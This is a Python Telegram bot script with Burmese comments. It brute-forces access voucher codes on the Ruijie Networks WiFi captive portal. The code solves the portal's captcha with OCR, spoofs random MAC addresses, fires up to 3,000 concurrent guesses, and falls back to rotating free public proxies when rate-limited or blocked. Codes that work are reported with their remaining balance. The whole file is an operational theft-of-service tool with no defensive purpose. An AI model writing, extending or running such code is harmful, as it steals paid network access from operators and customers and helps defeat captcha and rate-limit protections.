#!/usr/bin/env python3
import re
import json
import base64
import random
import string
import time
import asyncio
import aiohttp
import cv2
import ddddocr
import numpy as np
import os
import gc
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ── CONFIGURATION (GitHub Secrets / Environment Variables မှ ရယူမည်) ────[span_1](start_span)[span_1](end_span)
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID_STR = os.getenv("ADMIN_ID", "0")
ADMIN_ID = int(ADMIN_ID_STR) if ADMIN_ID_STR.isdigit() else 0

if not BOT_TOKEN or ADMIN_ID == 0:
    raise ValueError("❌ BOT_TOKEN သို့မဟုတ် ADMIN_ID ကို GitHub Secrets တွင် မှန်ကန်စွာ ထည့်သွင်းပေးပါ။")

BATCH_SIZE = 500        
INITIAL_CONCURRENT = 3000   # ပုံမှန်အခြေအနေတွင် သုံးမည့် Concurrency အမြင့်
BLOCKED_CONCURRENT = 300    # IP Block ခံရပါက လျှော့ချမည့် Concurrency အနိမ့်
CONNECTION_LIMIT = 3500
TIMEOUT = 25

# ── GLOBALS ────────────────────────────────______________________________
_connector = None
_ocr = None
DIGITS = list(string.digits)
LOWERCASE_CHARS = list(string.ascii_lowercase)
MIXED_CHARS = list(string.ascii_lowercase + string.digits)

# Proxy Management Globals
ACTIVE_PROXIES = []
CURRENT_PROXY_INDEX = 0
PROXY_LOCK = asyncio.Lock()

# User တစ်ယောက်ချင်းစီ၏ Scan State များကို မှတ်ထားရန် Dict
user_scans = {}

# ── OCR INITIALIZATION ───────────────────────────────────────────────────
def init_ocr():
    global _ocr
    if _ocr is None:
        _ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    try:
        init_ocr()
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        if img is None:
            return None
        _, buffer = cv2.imencode('.png', img)
        return _ocr.classification(buffer.tobytes()).upper()
    except Exception:
        return None

# ── PROXY MANAGER ────────────────────────────────────────────────────────

async def fetch_free_proxies():
    global ACTIVE_PROXIES
    api_urls = [
        "https://proxylist.geonode.com/api/proxy-list?limit=20&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    ]
    
    new_proxies = []
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(api_urls[0], timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    for item in data.get('data', []):
                        ip = item.get('ip')
                        port = item.get('port')
                        if ip and port:
                            new_proxies.append(f"http://{ip}:{port}")
        except Exception:
            pass

        if not new_proxies:
            try:
                async with session.get(api_urls[1], timeout=10) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        lines = text.strip().split('\r\n')
                        for line in lines:
                            if ":" in line:
                                new_proxies.append(f"http://{line.strip()}")
            except Exception:
                pass

    if new_proxies:
        async with PROXY_LOCK:
            ACTIVE_PROXIES = new_proxies
        print(f"✅ Loaded {len(new_proxies)} free proxies successfully.")

async def get_next_proxy():
    global CURRENT_PROXY_INDEX, ACTIVE_PROXIES
    async with PROXY_LOCK:
        if not ACTIVE_PROXIES:
            await fetch_free_proxies()
        
        if not ACTIVE_PROXIES:
            return None
        
        proxy = ACTIVE_PROXIES[CURRENT_PROXY_INDEX % len(ACTIVE_PROXIES)]
        CURRENT_PROXY_INDEX += 1
        return proxy

# ── HELPER FUNCTIONS ─────────────────────────────────────────────────────

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

def format_time(seconds):
    if seconds == float('inf') or seconds <= 0:
        return "N/A"
    if seconds > 86400:
        return f"{int(seconds/86400)}d {int((seconds%86400)/3600)}h"
    elif seconds > 3600:
        return f"{int(seconds/3600)}h {int((seconds%3600)/60)}m"
    elif seconds > 60:
        return f"{int(seconds/60)}m {int(seconds%60)}s"
    return f"{int(seconds)}s"

def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

# ── GENERATORS ──────────────────────────────────────────────────────────

def iter_lowercase(length=6):
    chars = LOWERCASE_CHARS
    common = ['admin', 'guest', 'user', 'pass', 'test', 'login', 'root', 'wifi']
    for word in common:
        if len(word) <= length:
            padded = word.ljust(length, 'a')
            if len(padded) == length:
                yield padded
    while True:
        yield ''.join(random.choice(chars) for _ in range(length))

def iter_mixed(length=6):
    chars = MIXED_CHARS
    while True:
        yield ''.join(random.choice(chars) for _ in range(length))

def iter_digit_codes(mode, start_digit=None):
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        if mode in ["6", "7"]:
            if start_digit is not None:
                start = int(start_digit) * (10 ** (length - 1))
                end = (int(start_digit) + 1) * (10 ** (length - 1))
                for i in range(start, end):
                    yield str(i).zfill(length)
                return
            else:
                codes = [str(i).zfill(length) for i in range(10 ** length)]
                random.shuffle(codes)
                yield from codes
                return
        if mode == "8":
            ranges = list(range(0, 100, 10))
            random.shuffle(ranges)
            for start_range in ranges:
                start = start_range * 1000000
                end = (start_range + 10) * 1000000
                chunk_codes = [str(i).zfill(8) for i in range(start, end)]
                random.shuffle(chunk_codes)
                yield from chunk_codes
                gc.collect()
        elif mode == "9":
            ranges = list(range(0, 1000, 10))
            random.shuffle(ranges)
            for start_range in ranges:
                start = start_range * 1000000
                end = (start_range + 10) * 1000000
                chunk_codes = [str(i).zfill(9) for i in range(start, end)]
                random.shuffle(chunk_codes)
                yield from chunk_codes
                gc.collect()

# ── CAPTCHA & RUIJIE API ─────────────────────────────────────────────────

async def get_session_id(session_obj, session_url, proxy=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'accept': 'text/html'}
    try:
        kwargs = {'headers': headers, 'allow_redirects': True, 'timeout': 5}
        if proxy:
            kwargs['proxy'] = proxy
        async with session_obj.get(url, **kwargs) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else None
    except Exception:
        return None

async def Captcha_Image(session_obj, session_id, proxy=None):
    params = {'sessionId': session_id, '_t': str(time.time())}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'}
    try:
        kwargs = {'params': params, 'headers': headers, 'timeout': 5}
        if proxy:
            kwargs['proxy'] = proxy
        async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', **kwargs) as req:
            return await req.read()
    except Exception:
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Varify_Captcha(session_obj, session_id, text, proxy=None):
    json_data = {'sessionId': session_id, 'authCode': text}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'content-type': 'application/json'}
    try:
        kwargs = {'headers': headers, 'json': json_data, 'timeout': 5}
        if proxy:
            kwargs['proxy'] = proxy
        async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', **kwargs) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except Exception:
        return None

async def get_balance_info(session_id, proxy=None):
    endpoints = [
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{session_id}",
    ]
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'accept': 'application/json'}
    
    async with aiohttp.ClientSession() as temp_session:
        for url in endpoints:
            try:
                kwargs = {'headers': headers, 'timeout': 8}
                if proxy:
                    kwargs['proxy'] = proxy
                async with temp_session.get(url, **kwargs) as resp:
                    if resp.status != 200:
                        continue
                    data = await resp.json()
                    if not data.get("success", False):
                        continue
                    result = data.get("result", {}) or data.get("data", {})
                    
                    minutes = None
                    for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance']:
                        if key in result and result[key] is not None:
                            minutes = result[key]
                            break
                    if minutes is None:
                        continue
                    
                    plan_name = result.get("profileName") or result.get("planName") or "Unknown"
                    mins_float = float(minutes)
                    
                    if mins_float <= 0:
                        display = "⏳ Expired"
                    elif mins_float >= 999999:
                        display = "♾️ Unlimited"
                    else:
                        total_secs = mins_float * 60
                        if total_secs > 86400:
                            display = f"⏱ {int(total_secs/86400)}d {int((total_secs%86400)/3600)}h"
                        elif total_secs > 3600:
                            display = f"⏱ {int(total_secs/3600)}h {int((total_secs%3600)/60)}m"
                        else:
                            display = f"⏱ {int(mins_float)}m"
                    
                    return f"📋 {plan_name} | {display}"
            except Exception:
                continue
    return "📋 Unknown | ⏱ N/A"

async def perform_check_with_config(session_url, code, proxy=None):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    timeout = aiohttp.ClientTimeout(total=10, connect=3)
    
    kwargs = {'connector': _connector, 'connector_owner': False, 'timeout': timeout}
    async with aiohttp.ClientSession(**kwargs) as task_session:
        session_id = await get_session_id(task_session, session_url, proxy=proxy)
        if not session_id:
            raise Exception("Session ID Error or Blocked")
        
        image = await Captcha_Image(task_session, session_id, proxy=proxy)
        if not image:
            raise Exception("Captcha Image Error or Blocked")
            
        text = await Captcha_Text(image)
        if not text:
            return None
            
        if not await Varify_Captcha(task_session, session_id, text, proxy=proxy):
            return None
        
        data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": text}
        headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36", "content-type": "application/json"}
        
        post_kwargs = {'json': data, 'headers': headers, 'timeout': 8}
        if proxy:
            post_kwargs['proxy'] = proxy
            
        async with task_session.post(post_url, **post_kwargs) as req:
            if req.status in [403, 429, 503]:
                raise Exception(f"IP Blocked with status {req.status}")
                
            response = await req.text()
            if 'logonUrl' in response:
                balance_display = await get_balance_info(session_id, proxy=proxy)
                return {"code": code, "balance": balance_display}
    return None

async def perform_check(state, session_url, code):
    """
    Dynamic Adaptive Concurrency Logic:
    - 3000 ဖြင့် Direct စစ်ဆေးမည်။
    - IP Block ခံရပါက Concurrency ကို 300 သို့ လျှော့ချမည်ပြီး Proxy ဖြင့် ဆက်စစ်မည်။
    """
    # 1. Try Direct First (High Concurrency 3000)
    try:
        state['current_status'] = "🟢 Direct (3,000 Speed)"
        result = await perform_check_with_config(session_url, code, proxy=None)
        return result
    except Exception:
        # Block ခံရလျှင် IP Blocks တိုးမည်၊ Concurrency ကို 300 သို့ ချမည်
        state['ip_blocks'] += 1
        state['current_concurrency'] = BLOCKED_CONCURRENT

    # 2. Fallback to Free Proxies (Low Concurrency 300)
    for _ in range(2):
        proxy = await get_next_proxy()
        if not proxy:
            break
        try:
            proxy_display = proxy.replace("http://", "")
            state['current_status'] = f"🔄 Proxy (300): {proxy_display[:18]}"
            state['proxy_switches'] += 1
            
            result = await perform_check_with_config(session_url, code, proxy=proxy)
            return result
        except Exception:
            state['ip_blocks'] += 1
            continue
            
    return None

# ── TELEGRAM HANDLERS ────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ ခွင့်ပြုချက်မရှိပါ။ Admin သာ အသုံးပြုနိုင်ပါသည်။")
        return

    user_scans[user_id] = {
        'url': None,
        'running': False,
        'mode': '6',
        'found_codes': [],
        'checked': 0,
        'start_time': 0,
        'task': None,
        'ip_blocks': 0,
        'proxy_switches': 0,
        'current_concurrency': INITIAL_CONCURRENT,
        'current_status': 'Idle'
    }
    
    msg = (
        "🔥 **RUIJIE EXTREME SCANNER BOT (DYNAMIC CONCURRENCY)** 🔥\n\n"
        "စတင်ရန် Portal URL ကို ပေးပို့ပါ။"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ ခွင့်ပြုချက်မရှိပါ။ Admin သာ အသုံးပြုနိုင်ပါသည်။")
        return

    text = update.message.text.strip()
    
    if user_id not in user_scans:
        user_scans[user_id] = {
            'url': None, 'running': False, 'mode': '6', 'found_codes': [], 
            'checked': 0, 'start_time': 0, 'task': None, 
            'ip_blocks': 0, 'proxy_switches': 0, 
            'current_concurrency': INITIAL_CONCURRENT, 'current_status': 'Idle'
        }
    
    if "portal-as.ruijienetworks.com" in text or "mac=" in text:
        if "mac=" not in text:
            text += "&mac=02:00:00:00:00:00" if "?" in text else "?mac=02:00:00:00:00:00"
        
        user_scans[user_id]['url'] = text
        await show_main_menu(update, context)
    else:
        await update.message.reply_text("❌ မှန်ကန်သော Portal URL မဟုတ်ပါ။ ပြန်လည်စစ်ဆေးပေးပါ။")

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = user_scans[user_id]
    
    keyboard = [
        [InlineKeyboardButton("🔢 Mode ရွေးချယ်ရန်", callback_data="select_mode")],
        [InlineKeyboardButton("🚀 Scan စတင်ရန်", callback_data="start_scan"), InlineKeyboardButton("⏹️ ရပ်တန့်ရန်", callback_data="stop_scan")],
        [InlineKeyboardButton("📋 တွေ့ရှိထားသော Code များ", callback_data="view_codes")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    status = "🟢 Running" if state['running'] else "🔴 Stopped"
    msg = (
        f"⚙️ **Dashboard (Dynamic Adaptive Monitor)**\n\n"
        f"🔗 **URL:** `{str(state['url'])[:35]}...`\n"
        f"📊 **Mode:** `{state['mode']}`\n"
        f"⚡ **Status:** {status}\n"
        f"🚀 **Concurrency:** `{state['current_concurrency']:,}`\n"
        f"🔒 **IP Blocks:** {state['ip_blocks']}\n"
        f"🌐 **Proxy Switches:** {state['proxy_switches']}\n"
        f"🔌 **Current:** `{state['current_status']}`\n"
        f"✅ **Found:** {len(state['found_codes'])} codes\n"
    )
    
    if update.message:
        await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.callback_query.edit_message_text(msg, reply_markup=reply_markup, parse_mode='Markdown')

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if not is_admin(user_id):
        await query.answer("❌ ခွင့်ပြုချက်မရှိပါ။ Admin သာ အသုံးပြုနိုင်ပါသည်။", show_alert=True)
        return

    await query.answer()
    data = query.data
    
    if user_id not in user_scans:
        await query.edit_message_text("❌ Session သက်တမ်းကုန်သွားပါပြီ။ /start ပြန်စပါ။")
        return

    state = user_scans[user_id]

    if data == "select_mode":
        keyboard = [
            [InlineKeyboardButton("6 Digit", callback_data="set_6"), InlineKeyboardButton("7 Digit", callback_data="set_7")],
            [InlineKeyboardButton("8 Digit", callback_data="set_8"), InlineKeyboardButton("9 Digit", callback_data="set_9")],
            [InlineKeyboardButton("Lower 6 (a-z)", callback_data="set_lower6"), InlineKeyboardButton("Mixed 6", callback_data="set_mixed6")],
            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
        ]
        await query.edit_message_text("🔢 **Scan ပြုလုပ်လိုသည့် Mode ကို ရွေးပါ:**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

    elif data.startswith("set_"):
        mode = data.replace("set_", "")
        state['mode'] = mode
        await query.edit_message_text(f"✅ Mode ကို **{mode}** သို့ ပြောင်းလဲပြီးပါပြီ။")
        await asyncio.sleep(1)
        await show_main_menu(update, context)

    elif data == "start_scan":
        if state['running']:
            await query.edit_message_text("⚠️ Scan သည် ပတ်နေဆဲဖြစ်သည်။")
            return
        if not state['url']:
            await query.edit_message_text("❌ URL မရှိသေးပါ။ URL အရင် ပို့ပေးပါ။")
            return
        
        state['running'] = True
        state['checked'] = 0
        state['ip_blocks'] = 0
        state['proxy_switches'] = 0
        state['current_concurrency'] = INITIAL_CONCURRENT
        state['start_time'] = time.time()
        state['task'] = asyncio.create_task(run_scan_task(user_id, context, query.message.chat_id, query.message.message_id))
        await query.edit_message_text("🚀 **Scan စတင်နေပါပြီ (Dynamic 3000/300 Mode Active)...**")

    elif data == "stop_scan":
        if state['running']:
            state['running'] = False
            if state['task']:
                state['task'].cancel()
            await query.edit_message_text("⏹️ Scan ကို ရပ်တန့်လိုက်ပါပြီ။")
        else:
            await query.edit_message_text("⚠️ ရပ်စရာ Scan မရှိပါ။")

    elif data == "view_codes":
        codes = state['found_codes']
        if not codes:
            text = "📭 မည်သည့် Code မှ ရှာမတွေ့သေးပါ။"
        else:
            text = "🔥 **တွေ့ရှိထားသော Code များ:**\n\n"
            for i, c in enumerate(codes, 1):
                text += f"{i}. `{c['code']}` | {c['balance']}\n"
        
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

    elif data == "main_menu":
        await show_main_menu(update, context)

# ── BACKGROUND SCAN TASK ────────────────────────────────────────────────

async def run_scan_task(user_id, context, chat_id, message_id):
    state = user_scans[user_id]
    mode = state['mode']
    
    if mode.startswith("mixed"):
        code_iter = iter_mixed(int(mode.replace("mixed", "")))
    elif mode.startswith("lower"):
        code_iter = iter_lowercase(int(mode.replace("lower", "")))
    else:
        code_iter = iter_digit_codes(mode)

    last_update_time = time.time()

    try:
        while state['running']:
            # 動的に concurrency ကို ထိန်းချုပ်ရန် state['current_concurrency'] အရ Semaphore ကို ချိန်ညှိမည်
            current_limit = state['current_concurrency']
            sem = asyncio.Semaphore(current_limit)

            async def _worker(code):
                async with sem:
                    if not state['running']:
                        return None
                    return await perform_check(state, state['url'], code)

            batch = [next(code_iter) for _ in range(BATCH_SIZE)]
            results = await asyncio.gather(*[_worker(c) for c in batch])

            for res in results:
                if res:
                    state['found_codes'].append(res)
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=f"🎉 **Code သစ်တွေ့ရှိသည်!**\n\n🔑 Code: `{res['code']}`\n{res['balance']}",
                        parse_mode='Markdown'
                    )

            state['checked'] += len(batch)

            if time.time() - last_update_time > 3:
                elapsed = time.time() - state['start_time']
                speed = (state['checked'] / elapsed * 60) if elapsed > 0 else 0
                
                status_msg = (
                    f"⚡ **Scanning Live Dashboard...**\n\n"
                    f"📊 **Mode:** `{mode}`\n"
                    f"📦 **Checked:** {state['checked']:,}\n"
                    f"⚡ **Speed:** {speed:,.0f} /min\n"
                    f"🚀 **Concurrency:** `{state['current_concurrency']:,}`\n"
                    f"🔒 **IP Blocks:** {state['ip_blocks']}\n"
                    f"🌐 **Proxy Switches:** {state['proxy_switches']}\n"
                    f"🔌 **Current:** `{state['current_status']}`\n"
                    f"✅ **Found:** {len(state['found_codes'])}\n"
                    f"⏱ **Time:** {format_time(elapsed)}"
                )
                keyboard = [[InlineKeyboardButton("⏹️ ရပ်တန့်ရန်", callback_data="stop_scan")]]
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=status_msg,
                        reply_markup=InlineKeyboardMarkup(keyboard),
                        parse_mode='Markdown'
                    )
                except Exception:
                    pass
                last_update_time = time.time()

            await asyncio.sleep(0.1)

    except asyncio.CancelledError:
        pass
    finally:
        state['running'] = False
        state['current_status'] = 'Stopped'

# ── MAIN BOT RUNNER ──────────────────────────────────────────────────────

async def post_init(application: Application):
    global _connector
    _connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT, enable_cleanup_closed=False)
    await fetch_free_proxies()

def main():
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🤖 Telegram Bot Starting (Dynamic Concurrency & Live UI Active)...")
    app.run_polling()

if __name__ == '__main__':
    main()
